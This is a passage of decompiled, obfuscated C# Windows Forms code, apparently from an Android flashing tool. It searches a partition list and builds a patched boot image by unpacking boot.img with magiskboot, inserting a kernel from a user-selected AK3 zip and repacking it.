			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fileName);
			string value = (string)_186(fileName);
			DataGridViewRow dataGridViewRow = ((DataGridView)this.m_16e).Rows[((DataGridViewCellMouseEventArgs)e).RowIndex];
			dataGridViewRow.Cells["Pname"].Value = fileNameWithoutExtension;
			dataGridViewRow.Cells["pathfile"].Value = fileName;
			dataGridViewRow.Cells["Sizestar"].Value = value;
			dataGridViewRow.Cells["checke"].Value = true;
		}
	}

	private void _1ac(object sender, object e)
	{
		if (((Control)this.m_174).Text == "查找单分区")
		{
			((Control)this.m_174).Text = "";
			((Control)this.m_174).ForeColor = Color.Black;
		}
	}

	private void _1ad(object sender, object e)
	{
		if (((KeyEventArgs)e).KeyCode != Keys.Return)
		{
			return;
		}
		string value = ((Control)this.m_174).Text.Trim();
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_16e).Rows)
		{
			if (!item.IsNewRow)
			{
				string text = item.Cells["Pname"].Value?.ToString();
				if (!string.IsNullOrEmpty(text) && text.Equals(value, StringComparison.OrdinalIgnoreCase))
				{
					item.Selected = true;
					((DataGridView)this.m_16e).FirstDisplayedScrollingRowIndex = item.Index;
					break;
				}
			}
		}
		((KeyEventArgs)e).Handled = true;
		((KeyEventArgs)e).SuppressKeyPress = true;
	}

	private void _1ae(object sender, object e)
	{
		if (((ListControl)this.m_174).SelectedIndex < 0)
		{
			return;
		}
		string text = ((ComboBox)this.m_174).SelectedItem?.ToString();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_16e).Rows)
		{
			if (!item.IsNewRow)
			{
				string text2 = item.Cells["Pname"].Value?.ToString();
				if (text2 == text)
				{
					((DataGridView)this.m_16e).ClearSelection();
					item.Selected = true;
					((DataGridView)this.m_16e).FirstDisplayedScrollingRowIndex = item.Index;
					break;
				}
			}
		}
	}

	private void _1af(object sender, object e)
	{
		if ((int)(nint)this.m_84 != 0)
		{
			return;
		}
		string text = ((Control)this.m_174).Text.Trim();
		if (string.IsNullOrEmpty(text))
		{
			((ComboBox)this.m_174).DroppedDown = false;
			return;
		}
		this.m_84 = (IntPtr)1;
		int selectionStart = ((ComboBox)this.m_174).SelectionStart;
		List<string> list = new List<string>();
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_16e).Rows)
		{
			if (!item.IsNewRow)
			{
				string text2 = item.Cells["Pname"].Value?.ToString();
				if (!string.IsNullOrEmpty(text2) && text2.StartsWith(text, StringComparison.OrdinalIgnoreCase))
				{
					list.Add(text2);
				}
			}
		}
		if (list.Count == 0)
		{
			((ComboBox)this.m_174).DroppedDown = false;
			this.m_84 = (IntPtr)0;
			return;
		}
		((ComboBox)this.m_174).DroppedDown = false;
		((ComboBox)this.m_174).Items.Clear();
		ComboBox.ObjectCollection items = ((ComboBox)this.m_174).Items;
		object[] items2 = list.ToArray();
		items.AddRange(items2);
		((Control)this.m_174).Text = text;
		((ComboBox)this.m_174).SelectionStart = selectionStart;
		((ComboBox)this.m_174).SelectionLength = 0;
		((Control)this.m_174).Cursor = Cursors.Default;
		this.m_84 = (IntPtr)0;
	}

	private void _1b0(object sender, object e)
	{
		if (string.IsNullOrEmpty(((Control)this.m_174).Text))
		{
			if (lang == "zh")
			{
				((Control)this.m_174).Text = "查找单分区";
			}
			else
			{
				((Control)this.m_174).Text = "Find partition";
			}
			((Control)this.m_174).ForeColor = Color.Gray;
		}
	}

	private async Task _1b1(object arguments)
	{
		object obj = Path.Combine((string)this.m_85, "magiskboot.exe");
		if (!File.Exists((string)obj))
		{
			Msg("magiskboot.exe 不存在于: " + (string)obj);
			return;
		}
		try
		{
			object startInfo = new ProcessStartInfo
			{
				FileName = (string)obj,
				Arguments = (string)arguments,
				WorkingDirectory = (string)this.m_85,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				UseShellExecute = false,
				CreateNoWindow = true,
				StandardOutputEncoding = Encoding.UTF8,
				StandardErrorEncoding = Encoding.UTF8
			};
			object obj2 = new Process();
			try
			{
				((Process)obj2).StartInfo = (ProcessStartInfo)startInfo;
				((Process)obj2).Start();
				await ((Process)obj2).StandardOutput.ReadToEndAsync();
				await ((Process)obj2).StandardError.ReadToEndAsync();
				await ((Process)obj2).WaitForExitAsync();
			}
			finally
			{
				((IDisposable)obj2)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Msg("magiskboot 执行失败: " + ex.Message);
		}
	}

	private object _1b2()
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "选择 AK3 文件";
		openFileDialog.Filter = "ZIP 文件 (*.zip)|*.zip";
		openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			return openFileDialog.FileName;
		}
		return string.Empty;
	}

	private void _1b3()
	{
		string[] source = new string[2]
		{
			Path.Combine((string)this.m_85, "new-boot.img"),
			Path.Combine((string)this.m_85, "magiskboot.exe")
		};
		try
		{
			string text = Path.Combine((string)this.m_85, "AK3");
			if (Directory.Exists(text))
			{
				Directory.Delete(text, recursive: true);
			}
			string[] files = Directory.GetFiles((string)this.m_85);
			foreach (string value in files)
			{
				if (!source.Contains(value, StringComparer.OrdinalIgnoreCase))
				{
					File.Delete(value);
				}
			}
		}
		catch (Exception ex)
		{
			Msg("清理失败: " + ex.Message + " \n");
		}
	}

	private async void _1b4(object bootpatch)
	{
		Directory.CreateDirectory((string)this.m_85);
		object obj = "boot.img";
		object destFileName = Path.Combine((string)this.m_85, (string)obj);
		try
		{
			object obj2 = Path.Combine((string)this.m_85, "magiskboot.exe");
			if (!File.Exists((string)obj2))
			{
				Msg("缺失依赖文件开始下载...");
				object obj3 = "C:\\TMFTool\\magiskboot.zip";
				object url = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/magiskboot.zip");
				Directory.CreateDirectory((string)this.m_85);
				try
				{
					((UIProcessBar)this.m_c1).Maximum = 100;
					await _111(url, obj3, (Action<int>)((int progress) =>
					{
						((UIProcessBar)this.m_c1).Value = (int)progress;
					}));
					fa();
					Msg("OK\n");
					if (!File.Exists((string)obj3))
					{
						fe("Error\n");
						File.Delete((string)obj3);
						return;
					}
					ZipFile.ExtractToDirectory((string)obj3, (string)this.m_85);
					File.Delete((string)obj3);
				}
				catch (Exception ex)
				{
					object obj4 = ex;
					msgred();
					Msg("下载失败: " + ((Exception)obj4).Message + "\n");
					return;
				}
			}
			File.Copy((string)bootpatch, (string)destFileName, overwrite: true);
			Msg("[Copy]" + (string)obj + " 工作目录就绪\n");
			await _1b1("unpack boot.img");
			object obj5 = _1b2();
			if (!string.IsNullOrEmpty((string)obj5))
			{
				object fileName = Path.GetFileName((string)obj5);
				Msg("选择AK3: " + (string)fileName + "\n");
				object destinationDirectoryName = Path.Combine((string)this.m_85, "AK3");
				if (Directory.Exists((string)destinationDirectoryName))
				{
					Directory.Delete((string)destinationDirectoryName, recursive: true);
				}
				Directory.CreateDirectory((string)destinationDirectoryName);
				ZipFile.ExtractToDirectory((string)obj5, (string)destinationDirectoryName);
				Msg("Ak3解析中...");
				object obj6 = Directory.GetFiles((string)destinationDirectoryName, "Image", SearchOption.AllDirectories).FirstOrDefault();
				if (string.IsNullOrEmpty((string)obj6))
				{
					msgred();
					Msg("无效AK3文件！\n");
					_1b3();
					return;
				}
				object destFileName2 = Path.Combine((string)this.m_85, "kernel");
				File.Copy((string)obj6, (string)destFileName2, overwrite: true);
				fa();
				Msg("OK\n");
				Msg("[Make]打包GKi镜像...");
				await _1b1("repack boot.img");
				fa();
				Msg("OK\n");
				_1b3();
				object folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				object obj7 = Path.Combine((string)folderPath, "TMF_GKI");
				if (!Directory.Exists((string)obj7))
				{
					Directory.CreateDirectory((string)obj7);
				}
				object fileNameWithoutExtension = Path.GetFileNameWithoutExtension((string)obj5);
				object obj8 = DateTime.Now.ToString("yyyyMMdd_HHmmss");
				object obj9 = "Boot_TMFMake_" + (string)fileNameWithoutExtension + "_" + (string)obj8 + ".img";
				object sourceFileName = Path.Combine((string)this.m_85, "new-boot.img");
				object destFileName3 = Path.Combine((string)obj7, (string)obj9);
				if (File.Exists((string)sourceFileName))
				{
					if (File.Exists((string)destFileName3))
					{
						File.Delete((string)destFileName3);
					}
					File.Move((string)sourceFileName, (string)destFileName3);
					Msg("生成镜像: " + (string)obj9 + "\n");
				}
				else
				{
					Msg("未找到 new-boot.img\n");
				}
				Process.Start("explorer.exe", (string)obj7);
			}
			else
			{
				Msg("用户取消选择 AK3 文件\n");
			}
		}
		catch (Exception ex)
		{
			object obj10 = ex;
			Msg("操作失败: " + ((Exception)obj10).Message + "\n");
		}
	}

	private void _1b5(object sender, object e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "boot.img|*.img";
		openFileDialog.Title = "选择Boot镜像";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string[] fileNames = openFileDialog.FileNames;
			string[] array = fileNames;
			foreach (string text in array)
			{
				Msg("选择的文件: " + text + "\n");
				_1b4(text);
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && this.m_86 != null)
		{
			((IDisposable)this.m_86).Dispose();
		}
		base.Dispose(disposing);
	}

	private void _1b7()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected Obj, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected Obj, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected Obj, but got Unknown
		//IL_0423: Unknown result type (might be due to invalid IL or missing references)
		//IL_042d: Expected Obj, but got Unknown
		//IL_042e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0438: Expected Obj, but got Unknown
		//IL_0439: Unknown result type (might be due to invalid IL or missing references)
		//IL_0443: Expected Obj, but got Unknown
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_044e: Expected Obj, but got Unknown
		//IL_044f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0459: Expected Obj, but got Unknown
		//IL_045a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0464: Expected Obj, but got Unknown
		//IL_0465: Unknown result type (might be due to invalid IL or missing references)
		//IL_046f: Expected Obj, but got Unknown
		//IL_047b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0485: Expected Obj, but got Unknown
		//IL_0486: Unknown result type (might be due to invalid IL or missing references)
		//IL_0490: Expected Obj, but got Unknown
		//IL_0491: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Expected Obj, but got Unknown
		//IL_049c: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a6: Expected Obj, but got Unknown
		//IL_04b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bc: Expected Obj, but got Unknown
		//IL_04bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Expected Obj, but got Unknown
		//IL_04d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04dd: Expected Obj, but got Unknown
		//IL_0557: Unknown result type (might be due to invalid IL or missing references)
		//IL_0561: Expected Obj, but got Unknown
		//IL_0562: Unknown result type (might be due to invalid IL or missing references)
		//IL_056c: Expected Obj, but got Unknown
		//IL_056d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0577: Expected Obj, but got Unknown
		//IL_0578: Unknown result type (might be due to invalid IL or missing references)
		//IL_0582: Expected Obj, but got Unknown
		//IL_0583: Unknown result type (might be due to invalid IL or missing references)
		//IL_058d: Expected Obj, but got Unknown
		//IL_058e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0598: Expected Obj, but got Unknown
		//IL_0599: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a3: Expected Obj, but got Unknown
		//IL_05a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ae: Expected Obj, but got Unknown
		//IL_05c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cf: Expected Obj, but got Unknown
		//IL_05d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected Obj, but got Unknown
		//IL_05db: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e5: Expected Obj, but got Unknown
		//IL_05e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f0: Expected Obj, but got Unknown
		//IL_05f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fb: Expected Obj, but got Unknown
		//IL_05fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0606: Expected Obj, but got Unknown
		//IL_0607: Unknown result type (might be due to invalid IL or missing references)
		//IL_0611: Expected Obj, but got Unknown
		//IL_0649: Unknown result type (might be due to invalid IL or missing references)
		//IL_0653: Expected Obj, but got Unknown
		//IL_066a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0674: Expected Obj, but got Unknown
		//IL_0675: Unknown result type (might be due to invalid IL or missing references)
		//IL_067f: Expected Obj, but got Unknown
		//IL_0696: Unknown result type (might be due to invalid IL or missing references)
		//IL_06a0: Expected Obj, but got Unknown
		//IL_06a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ab: Expected Obj, but got Unknown
		//IL_06ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_06b6: Expected Obj, but got Unknown
		//IL_06b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_06c1: Expected Obj, but got Unknown
		//IL_06c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_06cc: Expected Obj, but got Unknown
		//IL_06cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d7: Expected Obj, but got Unknown
		//IL_06ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f8: Expected Obj, but got Unknown
		//IL_06f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0703: Expected Obj, but got Unknown
		//IL_0704: Unknown result type (might be due to invalid IL or missing references)
		//IL_070e: Expected Obj, but got Unknown
		//IL_0746: Unknown result type (might be due to invalid IL or missing references)
		//IL_0750: Expected Obj, but got Unknown
		//IL_075c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0766: Expected Obj, but got Unknown
		//IL_0789: Unknown result type (might be due to invalid IL or missing references)
		//IL_0793: Expected Obj, but got Unknown
		//IL_0794: Unknown result type (might be due to invalid IL or missing references)
		//IL_079e: Expected Obj, but got Unknown
		//IL_07aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b4: Expected Obj, but got Unknown
		//IL_07b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bf: Expected Obj, but got Unknown
		//IL_07c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ca: Expected Obj, but got Unknown
		//IL_07cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d5: Expected Obj, but got Unknown
		//IL_07ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f6: Expected Obj, but got Unknown
		//IL_07f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0801: Expected Obj, but got Unknown
		//IL_0802: Unknown result type (might be due to invalid IL or missing references)
		//IL_080c: Expected Obj, but got Unknown
		//IL_080d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0817: Expected Obj, but got Unknown
		//IL_0818: Unknown result type (might be due to invalid IL or missing references)
		//IL_0822: Expected Obj, but got Unknown
		//IL_0823: Unknown result type (might be due to invalid IL or missing references)
		//IL_082d: Expected Obj, but got Unknown
		//IL_082e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0838: Expected Obj, but got Unknown
		//IL_0839: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Expected Obj, but got Unknown
		//IL_0844: Unknown result type (might be due to invalid IL or missing references)
		//IL_084e: Expected Obj, but got Unknown
		//IL_084f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0859: Expected Obj, but got Unknown
		//IL_085a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0864: Expected Obj, but got Unknown
		//IL_0865: Unknown result type (might be due to invalid IL or missing references)
		//IL_086f: Expected Obj, but got Unknown
		//IL_0870: Unknown result type (might be due to invalid IL or missing references)
		//IL_087a: Expected Obj, but got Unknown
		//IL_08d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_08e3: Expected Obj, but got Unknown
		//IL_08e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ee: Expected Obj, but got Unknown
		//IL_08ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f9: Expected Obj, but got Unknown
		//IL_08fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0904: Expected Obj, but got Unknown
		//IL_0905: Unknown result type (might be due to invalid IL or missing references)
		//IL_090f: Expected Obj, but got Unknown
		//IL_0910: Unknown result type (might be due to invalid IL or missing references)
		//IL_091a: Expected Obj, but got Unknown
		//IL_091b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0925: Expected Obj, but got Unknown
		//IL_0926: Unknown result type (might be due to invalid IL or missing references)
		//IL_0930: Expected Obj, but got Unknown
		//IL_0989: Unknown result type (might be due to invalid IL or missing references)
		//IL_0993: Expected Obj, but got Unknown
		//IL_0994: Unknown result type (might be due to invalid IL or missing references)
		//IL_099e: Expected Obj, but got Unknown
		//IL_099f: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a9: Expected Obj, but got Unknown
		//IL_09aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b4: Expected Obj, but got Unknown
		//IL_09b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_09bf: Expected Obj, but got Unknown
		//IL_09c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ca: Expected Obj, but got Unknown
		//IL_09d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e0: Expected Obj, but got Unknown
		//IL_09e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_09eb: Expected Obj, but got Unknown
		//IL_09ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f6: Expected Obj, but got Unknown
		//IL_09f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a01: Expected Obj, but got Unknown
		//IL_0a02: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0c: Expected Obj, but got Unknown
		//IL_0a0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a17: Expected Obj, but got Unknown
		//IL_0a18: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a22: Expected Obj, but got Unknown
		//IL_0a23: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a2d: Expected Obj, but got Unknown
		//IL_0a2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a38: Expected Obj, but got Unknown
		//IL_0a39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a43: Expected Obj, but got Unknown
		//IL_0a44: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4e: Expected Obj, but got Unknown
		//IL_0a4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a59: Expected Obj, but got Unknown
		//IL_0a70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a7a: Expected Obj, but got Unknown
		//IL_0a7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a85: Expected Obj, but got Unknown
		//IL_4ff8: Unknown result type (might be due to invalid IL or missing references)
		//IL_5002: Expected Obj, but got Unknown
		//IL_6c9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_6ca8: Expected Obj, but got Unknown
		//IL_84a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_84ad: Expected Obj, but got Unknown
		//IL_8540: Unknown result type (might be due to invalid IL or missing references)
		//IL_854a: Expected Obj, but got Unknown
		//IL_85dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_85e7: Expected Obj, but got Unknown
		//IL_867a: Unknown result type (might be due to invalid IL or missing references)
		//IL_8684: Expected Obj, but got Unknown
		//IL_8714: Unknown result type (might be due to invalid IL or missing references)
		//IL_871e: Expected Obj, but got Unknown
		//IL_87ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_87b7: Expected Obj, but got Unknown
		//IL_966d: Unknown result type (might be due to invalid IL or missing references)
		//IL_9677: Expected Obj, but got Unknown
		//IL_970d: Unknown result type (might be due to invalid IL or missing references)
		//IL_9717: Expected Obj, but got Unknown
		//IL_97ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_97b7: Expected Obj, but got Unknown
		this.m_86 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		StyleLine style = new StyleLine();
		StyleLine style2 = new StyleLine();
		this.m_87 = new RichTextBox();
		_88 = new Button();
		this.m_89 = new Button();
		this.m_8a = new ToolStripMenuItem();
		this.m_8b = new ToolStripMenuItem();
		this.m_8c = new ToolStripMenuItem();
		this.m_8d = new ToolStripMenuItem();
		this.m_8e = new CheckBox();
		this.m_8f = new GroupBox();
		this.m_c8 = new RichTextBox();
		this.m_c9 = new Button();
		this.m_ca = new RichTextBox();
		this.m_cb = new Button();
		this.m_bf = new Label();
		this.m_90 = new GroupBox();
		this.m_143 = new DataGridView();
		this.m_144 = new DataGridViewCheckBoxColumn();
		this.m_145 = new DataGridViewTextBoxColumn();
		this.m_146 = new DataGridViewTextBoxColumn();
		this.m_147 = new DataGridViewTextBoxColumn();
		this.m_148 = new DataGridViewTextBoxColumn();
		this.m_149 = new DataGridViewTextBoxColumn();
		this.m_14a = new DataGridViewTextBoxColumn();
		this.m_14b = new DataGridViewTextBoxColumn();
		this.m_14c = new DataGridViewTextBoxColumn();
		this.m_bb = new RichTextBox();
		this.m_c4 = (object)new UITextBox();
		this.m_c6 = new Button();
		this.m_eb = new Label();
		this.m_91 = new ComboBox();
		this.m_c2 = new Button();
		this.m_92 = new Label();
		this.m_93 = new ToolStripMenuItem();
		this.m_94 = new ToolStripMenuItem();
		this.m_95 = new ToolStripMenuItem();
		_96 = new ToolStripMenuItem();
		this.m_97 = new ToolStripMenuItem();
		this.m_98 = new ToolStripMenuItem();
		this.m_99 = new MenuStrip();
		this.m_ab = new ToolStripMenuItem();
		this.m_ac = new ToolStripMenuItem();
		this.m_ad = new ToolStripMenuItem();
		this.m_ae = new ToolStripMenuItem();
		this.m_af = new ToolStripMenuItem();
		this.m_b0 = new ToolStripMenuItem();
		this.m_e3 = new ToolStripMenuItem();
		this.m_150 = new ToolStripMenuItem();
		this.m_123 = new ToolStripMenuItem();
		this.m_153 = new ToolStripMenuItem();
		this.m_141 = new ToolStripMenuItem();
		this.m_152 = new ToolStripMenuItem();
		this.m_151 = new ToolStripMenuItem();
		this.m_b1 = new ToolStripMenuItem();
		this.m_b2 = new ToolStripMenuItem();
		this.m_b6 = new ToolStripMenuItem();
		this.m_b7 = new ToolStripMenuItem();
		this.m_b8 = new ToolStripMenuItem();
		this.m_b9 = new ToolStripMenuItem();
		this.m_12e = new ToolStripMenuItem();
		this.m_ba = new ToolStripMenuItem();
		this.m_bc = new ToolStripMenuItem();
		this.m_bd = new ToolStripMenuItem();
		this.m_13c = new ToolStripMenuItem();
		this.m_13d = new ToolStripMenuItem();
		_13e = new ToolStripMenuItem();
		this.m_b3 = new ToolStripMenuItem();
		this.m_b4 = new ToolStripMenuItem();
		this.m_be = new ToolStripMenuItem();
		this.m_14e = new ToolStripMenuItem();
		this.m_14f = new ToolStripMenuItem();
		this.m_177 = new ToolStripMenuItem();
		this.m_9a = new ToolStripMenuItem();
		this.m_9b = new ToolStripMenuItem();
		this.m_9c = new ToolStripMenuItem();
		this.m_9d = new ToolStripMenuItem();
		this.m_9e = new ToolStripMenuItem();
		this.m_9f = new ToolStripMenuItem();
		this.m_a0 = new ToolStripMenuItem();
		this.m_a1 = new ToolStripMenuItem();
		this.m_a2 = new ToolStripMenuItem();
		this.m_a3 = new ToolStripMenuItem();
		this.m_a4 = new ToolStripMenuItem();
		this.m_a5 = new ToolStripMenuItem();
		this.m_a6 = new ToolStripMenuItem();
		this.m_a7 = new ToolStripMenuItem();
		this.m_a8 = new ToolStripMenuItem();
		this.m_a9 = new ToolStripMenuItem();
		aa = new ToolStripMenuItem();
		this.m_b5 = new Label();
		this.m_cf = new Label();
		this.m_cd = new Label();
		this.m_c0 = new System.Windows.Forms.Timer((IContainer)this.m_86);
		this.m_c1 = (object)new UIProcessBar();
		this.m_c5 = (object)new UITextBox();
		this.m_d9 = (object)new UIRadioButton();
		this.m_da = (object)new UIRadioButton();
		this.m_cc = (object)new UICheckBox();
		this.m_c7 = (object)new UICheckBox();
		this.m_c3 = (object)new UITextBox();
		this.m_de = new GroupBox();
		this.m_df = (object)new UIButton();
		this.m_e0 = (object)new UIComboBox();
		this.m_e1 = (object)new UITextBox();
		this.m_e2 = (object)new UIButton();
		this.m_dd = new GroupBox();
		this.m_db = (object)new UIButton();
		this.m_ce = (object)new UIButton();
		this.m_ed = new Button();
		this.m_ec = (object)new UISymbolButton();
		this.m_d7 = new GroupBox();
		this.m_d6 = new CheckBox();
		this.m_d0 = new ListView();
		this.m_d1 = new ColumnHeader();
		this.m_d2 = new ColumnHeader();
		this.m_d3 = new ColumnHeader();
		this.m_d4 = new ColumnHeader();
		this.m_169 = new ColumnHeader();
		this.m_f8 = new TabControl();
		this.m_f9 = new TabPage();
		this.m_f0 = new GroupBox();
		this.m_16a = (object)new Checkbox();
		this.m_16b = (object)new Checkbox();
		this.m_10d = (object)new Tag();
		this.m_f3 = (object)new UISymbolButton();
		this.m_f4 = (object)new UISymbolButton();
		f1 = (object)new UISymbolButton();
		this.m_f2 = (object)new UISymbolButton();
		this.m_d8 = (object)new UIComboBox();
		this.m_103 = new TabPage();
		this.m_104 = new GroupBox();
		this.m_105 = (object)new UISymbolButton();
		this.m_fa = (object)new UISymbolButton();
		this.m_ef = (object)new UISymbolButton();
		this.m_ee = (object)new UISymbolButton();
		this.m_ea = (object)new UISymbolButton();
		this.m_d5 = (object)new UITextBox();
		this.m_102 = (object)new UIPanel();
		this.m_fb = new TabControl();
		fc = new TabPage();
		fd = new TabPage();
		this.m_fe = new TabPage();
		ff = new GroupBox();
		this.m_100 = (object)new UIButton();
		this.m_101 = new TabPage();
		this.m_f7 = new GroupBox();
		this.m_f6 = (object)new UISymbolButton();
		this.m_f5 = (object)new UISymbolButton();
		this.m_154 = new TabPage();
		this.m_155 = new GroupBox();
		this.m_15c = (object)new UISymbolButton();
		this.m_15b = (object)new UITextBox();
		this.m_15a = (object)new Radio();
		this.m_158 = (object)new Radio();
		this.m_159 = (object)new Select();
		this.m_156 = (object)new UISymbolButton();
		this.m_15d = new TabPage();
		this.m_15e = new GroupBox();
		this.m_161 = (object)new Checkbox();
		this.m_15f = (object)new UISymbolButton();
		_160 = (object)new UISymbolButton();
		this.m_e5 = new GroupBox();
		this.m_10e = new Label();
		this.m_10b = new Label();
		this.m_107 = new Label();
		this.m_106 = new Label();
		this.m_e6 = (object)new UIPanel();
		this.m_124 = new Label();
		this.m_e7 = (object)new UISymbolButton();
		this.m_dc = new System.Windows.Forms.Timer((IContainer)this.m_86);
		this.m_e4 = new System.Windows.Forms.Timer((IContainer)this.m_86);
		this.m_e8 = (object)new UIPanel();
		this.m_126 = (object)new UIComboBox();
		this.m_e9 = new GroupBox();
		this.m_10a = (object)new UIComboBox();
		this.m_109 = (object)new Checkbox();
		this.m_108 = (object)new Checkbox();
		this.m_10c = (object)new Alert();
		this.m_10f = new GroupBox();
		this.m_115 = new GroupBox();
		this.m_122 = (object)new Checkbox();
		this.m_121 = (object)new Checkbox();
		this.m_11f = (object)new Checkbox();
		this.m_120 = (object)new Checkbox();
		_11e = (object)new Checkbox();
		this.m_11b = (object)new Checkbox();
		this.m_11c = (object)new UITextBox();
		this.m_11d = (object)new UISymbolButton();
		this.m_116 = (object)new Tag();
		this.m_117 = (object)new UISymbolButton();
		this.m_118 = (object)new UISymbolButton();
		this.m_119 = (object)new UISymbolButton();
		this.m_11a = (object)new UIComboBox();
		this.m_110 = new CheckBox();
		this.m_111 = new ListView();
		this.m_112 = new ColumnHeader();
		this.m_113 = new ColumnHeader();
		this.m_114 = new ColumnHeader();
		this.m_14d = new ColumnHeader();
		this.m_16c = new ColumnHeader();
		this.m_125 = new System.Windows.Forms.Timer((IContainer)this.m_86);
		this.m_127 = (object)new Tabs();
		this.m_128 = (object)new AntdUI.TabPage();
		this.m_142 = (object)new Checkbox();
		this.m_12d = (object)new Checkbox();
		this.m_12c = (object)new Checkbox();
		this.m_129 = (object)new AntdUI.TabPage();
		this.m_12a = (object)new AntdUI.TabPage();
		this.m_12f = (object)new AntdUI.TabPage();
		this.m_176 = new GroupBox();
		this.m_173 = new CheckBox();
		this.m_16e = new DataGridView();
		this.m_16f = new DataGridViewCheckBoxColumn();
		this.m_170 = new DataGridViewTextBoxColumn();
		this.m_171 = new DataGridViewTextBoxColumn();
		this.m_172 = new DataGridViewTextBoxColumn();
		this.m_137 = new GroupBox();
		this.m_138 = (object)new Label();
		this.m_133 = (object)new UITextBox();
		this.m_134 = (object)new Select();
		this.m_135 = (object)new UITextBox();
		this.m_136 = (object)new UIPanel();
		this.m_175 = (object)new UISymbolButton();
		this.m_174 = new ComboBox();
		this.m_16d = (object)new Checkbox();
		this.m_13a = (object)new Checkbox();
		this.m_13b = (object)new Checkbox();
		this.m_139 = (object)new Checkbox();
		this.m_131 = (object)new UISymbolButton();
		this.m_132 = (object)new UISymbolButton();
		this.m_130 = (object)new Checkbox();
		this.m_12b = (object)new AntdUI.TabPage();
		this.m_162 = (object)new Tabs();
		this.m_163 = (object)new AntdUI.TabPage();
		this.m_164 = (object)new AntdUI.TabPage();
		this.m_168 = (object)new Input();
		this.m_165 = new Button();
		this.m_166 = new Button();
		this.m_167 = (object)new Input();
		_13f = (object)new WindowBar();
